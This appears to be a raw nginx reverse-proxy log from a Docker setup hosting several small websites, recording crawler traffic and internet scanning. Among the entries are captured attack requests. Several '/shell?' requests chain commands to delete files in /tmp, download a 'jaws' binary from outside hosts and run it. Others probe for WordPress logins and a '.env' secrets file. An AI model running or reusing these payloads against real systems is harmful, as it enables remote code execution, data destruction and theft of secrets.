[36mwebsites-www_mrpancho-1  | [0m/docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmrpancho.xyz 162.214.112.108 - - [06/Mar/2023:15:22:26 +0000] "POST / HTTP/1.1" 405 157 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0" "172.23.0.5:80"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 143.110.222.166 - - [06/Mar/2023:15:22:44 +0000] "GET / HTTP/1.1" 503 190 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0;31;1m2023/03/06 15:31:37 [warn] 61#61: no resolver defined to resolve r3.o.lencr.org while requesting certificate status, responder: r3.o.lencr.org, certificate: "/etc/nginx/certs/davidbriseno.com.crt"
[34mwebsites-nginx-proxy-1    | [0m[0m[0;33;1mnginx.1     | [0mdavidbriseno.com 207.46.13.215 - - [06/Mar/2023:15:31:38 +0000] "GET / HTTP/2.0" 200 742 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36" "172.23.0.6:80"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m_ 179.60.147.71 - - [06/Mar/2023:15:33:01 +0000] "\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x03<MJW\x0F\x7F_d\x93\xB6Gnnbt>\x00\x04\x98\xCD\xB8" 400 150 "-" "-" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m127.0.0.1 103.180.147.182 - - [06/Mar/2023:15:34:46 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+botbet.catbbos.fun/jaws;sh+/tmp/jaws HTTP/1.1" 503 190 "-" "Hello, world" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m127.0.0.1 37.113.194.41 - - [06/Mar/2023:15:45:33 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+update.rawupdater.cf/jaws;sh+/tmp/jaws HTTP/1.1" 503 190 "-" "Hello, world" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mfranciscosanudo.com 95.108.213.111 - - [06/Mar/2023:15:50:05 +0000] "GET /robots.txt HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "172.23.0.4:80"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mwww.franciscosanudo.com 213.180.203.192 - - [06/Mar/2023:15:50:05 +0000] "GET /robots.txt HTTP/1.1" 301 169 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mwww.franciscosanudo.com 213.180.203.191 - - [06/Mar/2023:15:50:05 +0000] "GET /robots.txt HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "172.23.0.4:80"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mwww.franciscosanudo.com 213.180.203.192 - - [06/Mar/2023:15:50:05 +0000] "GET /robots.txt HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "172.23.0.4:80"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mfranciscosanudo.com 213.180.203.112 - - [06/Mar/2023:15:50:06 +0000] "GET / HTTP/1.1" 200 7134 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "172.23.0.4:80"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mwww.franciscosanudo.com 95.108.213.209 - - [06/Mar/2023:15:50:06 +0000] "GET / HTTP/1.1" 200 7134 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "172.23.0.4:80"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mwww.franciscosanudo.com 95.108.213.200 - - [06/Mar/2023:15:50:06 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m127.0.0.1 103.173.157.229 - - [06/Mar/2023:15:52:28 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+45.77.243.49/jaws;sh+/tmp/jaws HTTP/1.1" 503 190 "-" "Hello, world" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mfranciscosanudo.com 104.227.65.28 - - [06/Mar/2023:16:02:52 +0000] "GET / HTTP/1.1" 301 169 "http://franciscosanudo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mfranciscosanudo.com 104.227.65.28 - - [06/Mar/2023:16:02:53 +0000] "GET / HTTP/1.1" 200 7134 "http://franciscosanudo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15" "172.23.0.4:80"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mhnks82.com 94.102.51.9 - - [06/Mar/2023:16:17:32 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mhnks82.com 94.102.51.9 - - [06/Mar/2023:16:19:18 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 143.110.222.166 - - [06/Mar/2023:16:22:28 +0000] "GET / HTTP/1.1" 503 190 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:16:45:13 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:16:46:09 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:16:48:50 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:14:36 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 95.215.234.49 - - [06/Mar/2023:17:16:11 +0000] "GET / HTTP/1.1" 503 190 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:20:14 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 143.110.222.166 - - [06/Mar/2023:17:20:57 +0000] "GET / HTTP/1.1" 503 190 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:21:00 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mfranciscosanudo.com 220.73.57.24 - - [06/Mar/2023:17:25:52 +0000] "HEAD / HTTP/1.1" 301 0 "https://www.bing.com" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mfranciscosanudo.com 220.73.57.24 - - [06/Mar/2023:17:25:53 +0000] "HEAD / HTTP/2.0" 200 0 "https://www.bing.com" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36" "172.23.0.4:80"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mfranciscosanudo.com 220.73.57.24 - - [06/Mar/2023:17:25:54 +0000] "GET /wp-login.php HTTP/1.1" 301 169 "http://franciscosanudo.com" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mfranciscosanudo.com 220.73.57.24 - - [06/Mar/2023:17:25:54 +0000] "GET /wp-login.php HTTP/2.0" 404 555 "http://franciscosanudo.com" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36" "172.23.0.4:80"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mfranciscosanudo.com 220.73.57.24 - - [06/Mar/2023:17:25:55 +0000] "GET /wordpress/wp-login.php HTTP/1.1" 301 169 "http://franciscosanudo.com" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mfranciscosanudo.com 220.73.57.24 - - [06/Mar/2023:17:25:56 +0000] "GET /wordpress/wp-login.php HTTP/2.0" 404 555 "http://franciscosanudo.com" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36" "172.23.0.4:80"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mfranciscosanudo.com 220.73.57.24 - - [06/Mar/2023:17:25:56 +0000] "GET /blog/wp-login.php HTTP/1.1" 301 169 "http://franciscosanudo.com" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mfranciscosanudo.com 220.73.57.24 - - [06/Mar/2023:17:25:57 +0000] "GET /blog/wp-login.php HTTP/2.0" 404 555 "http://franciscosanudo.com" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36" "172.23.0.4:80"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mfranciscosanudo.com 220.73.57.24 - - [06/Mar/2023:17:25:57 +0000] "GET /wp/wp-login.php HTTP/1.1" 301 169 "http://franciscosanudo.com" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mfranciscosanudo.com 220.73.57.24 - - [06/Mar/2023:17:25:57 +0000] "GET /wp/wp-login.php HTTP/2.0" 404 555 "http://franciscosanudo.com" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36" "172.23.0.4:80"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mdavidbriseno.com 131.153.143.50 - - [06/Mar/2023:17:27:22 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mdavidbriseno.com 131.153.143.50 - - [06/Mar/2023:17:27:22 +0000] "GET / HTTP/1.1" 200 742 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "172.23.0.6:80"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:27:37 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:28:19 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:29:12 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:29:41 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:30:35 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:31:05 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:31:50 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:32:36 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 185.254.196.223 - - [06/Mar/2023:17:32:59 +0000] "GET /.env HTTP/1.1" 503 592 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 185.254.196.223 - - [06/Mar/2023:17:33:00 +0000] "POST / HTTP/1.1" 503 592 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:33:04 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:34:00 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:34:45 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:35:28 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:36:43 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:37:25 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:38:18 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:38:58 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:39:26 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m45.56.120.17 92.118.39.82 - - [06/Mar/2023:17:39:40 +0000] "GET / HTTP/1.1" 503 190 "-" "-" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:40:17 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:40:54 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:41:26 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:42:12 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:42:55 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:43:40 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:44:31 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:45:08 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:45:38 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0;31;1m2023/03/06 17:46:17 [warn] 61#61: no resolver defined to resolve r3.o.lencr.org while requesting certificate status, responder: r3.o.lencr.org, certificate: "/etc/nginx/certs/www.davidbriseno.com.crt"
[34mwebsites-nginx-proxy-1    | [0m[0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:46:34 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0m_ 190.211.252.122 - - [06/Mar/2023:17:48:26 +0000] "CONNECT pro.ip-api.com:443 HTTP/1.1" 400 150 "-" "-" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:48:57 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:49:31 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:50:14 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:50:35 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:51:25 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:51:48 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0;31;1m2023/03/06 17:52:00 [warn] 61#61: no resolver defined to resolve r3.o.lencr.org while requesting certificate status, responder: r3.o.lencr.org, certificate: "/etc/nginx/certs/davidbriseno.com.crt"
[34mwebsites-nginx-proxy-1    | [0m[0m[0;33;1mnginx.1     | [0mdavidbriseno.com 52.51.98.123 - - [06/Mar/2023:17:52:01 +0000] "GET / HTTP/1.0" 200 742 "-" "Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)" "172.23.0.6:80"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:52:31 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:52:59 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:53:36 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:54:08 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:54:54 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:55:32 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:55:51 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:56:46 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:57:08 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:57:59 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:58:17 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:58:51 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:17:59:44 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
[34mwebsites-nginx-proxy-1    | [0m[0;33;1mnginx.1     | [0mmassage2017.net 94.102.51.9 - - [06/Mar/2023:18:00:12 +0000] "GET / HTTP/1.0" 503 190 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
